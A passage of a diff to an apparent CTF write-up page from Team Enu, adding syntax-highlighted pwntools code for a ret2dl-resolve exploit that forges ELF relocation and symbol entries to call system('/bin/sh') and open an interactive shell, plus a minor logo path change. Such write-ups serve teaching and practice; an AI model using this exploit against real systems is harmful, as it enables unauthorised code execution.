+buf <span style="color:#f92672">+=</span> p32(fake_elf32_rel_addr)  <span style="color:#75715e"># gets arg</span>
+
+<span style="color:#75715e"># gets(fake_elf32_sym_addr)</span>
+buf <span style="color:#f92672">+=</span> p32(gets_plt)             <span style="color:#75715e"># pop ret return addr</span>
+buf <span style="color:#f92672">+=</span> p32(pop_ret)              <span style="color:#75715e"># gets return addr</span>
+buf <span style="color:#f92672">+=</span> p32(fake_elf32_sym_addr)  <span style="color:#75715e"># gets arg</span>
+
+<span style="color:#75715e"># gets(system_symbol_addr)</span>
+buf <span style="color:#f92672">+=</span> p32(gets_plt)             <span style="color:#75715e"># pop ret return addr</span>
+buf <span style="color:#f92672">+=</span> p32(pop_ret)              <span style="color:#75715e"># gets return addr</span>
+buf <span style="color:#f92672">+=</span> p32(system_symbol_addr)   <span style="color:#75715e"># gets arg</span>
+
+<span style="color:#75715e"># gets(sh_symbol_addr)</span>
+buf <span style="color:#f92672">+=</span> p32(gets_plt)             <span style="color:#75715e"># pop ret return addr</span>
+buf <span style="color:#f92672">+=</span> p32(pop_ret)              <span style="color:#75715e"># gets return addr</span>
+buf <span style="color:#f92672">+=</span> p32(sh_symbol_addr)       <span style="color:#75715e"># gets arg</span>
+
+<span style="color:#75715e"># system(&#39;/bin/sh&#39;)</span>
+buf <span style="color:#f92672">+=</span> p32(plt)                  <span style="color:#75715e"># pop ret return addr</span>
+buf <span style="color:#f92672">+=</span> p32(reloc_arg)            <span style="color:#75715e"># reloc arg</span>
+buf <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>)           <span style="color:#75715e"># system retrun addr</span>
+buf <span style="color:#f92672">+=</span> p32(sh_symbol_addr)       <span style="color:#75715e"># system arg</span>
+
+conn<span style="color:#f92672">.</span>sendline(buf)
+
+<span style="color:#75715e"># create Elf32_Rel</span>
+r_offset <span style="color:#f92672">=</span> gets_got
+r_info   <span style="color:#f92672">=</span> ((fake_elf32_sym_addr <span style="color:#f92672">-</span> dynsym)<span style="color:#f92672">//</span><span style="color:#ae81ff">0x10</span>)<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">7</span>
+
+fake_elf32_rel <span style="color:#f92672">=</span> p32(r_offset)
+fake_elf32_rel <span style="color:#f92672">+=</span> p32(r_info)
+
+conn<span style="color:#f92672">.</span>sendline(fake_elf32_rel)
+
+<span style="color:#75715e"># create Elf32_Sym</span>
+st_name <span style="color:#f92672">=</span> system_symbol_addr <span style="color:#f92672">-</span> dynstr
+st_value <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
+st_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
+st_info <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x12</span>
+st_other <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
+st_shndx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
+
+fake_elf32_sym <span style="color:#f92672">=</span> p32(st_name)
+fake_elf32_sym <span style="color:#f92672">+=</span> p32(st_value)
+fake_elf32_sym <span style="color:#f92672">+=</span> p32(st_size)
+fake_elf32_sym <span style="color:#f92672">+=</span> p8(st_info)
+fake_elf32_sym <span style="color:#f92672">+=</span> p8(st_other)
+fake_elf32_sym <span style="color:#f92672">+=</span> p16(st_shndx)
+
+conn<span style="color:#f92672">.</span>sendline(fake_elf32_sym)
+
+<span style="color:#75715e"># create system symbol</span>
+conn<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;system&#39;</span>)
+
+<span style="color:#75715e"># create sh symbol</span>
+conn<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh&#39;</span>)
+
+conn<span style="color:#f92672">.</span>interactive()</code></pre></div>
 </div>
 <div id="outline-container-headline-20" class="outline-5">
 <h5 id="headline-20">
@@ -876,7 +876,7 @@ updated 2023/2/28</p>
             <section class="page__aside">
                 <div class="aside__about">
 <div class="aside__about">
-    <img class="about__logo" src="https://team-enu.github.io/team-enu.png" alt="Logo">
+    <img class="about__logo" src="/team-enu.png" alt="Logo">
 <h1 class="about__title">Team Enu</h1>
 <p class="about__description">Team EnuのWriteupや活動の紹介を掲載しています。</p>
 </div>
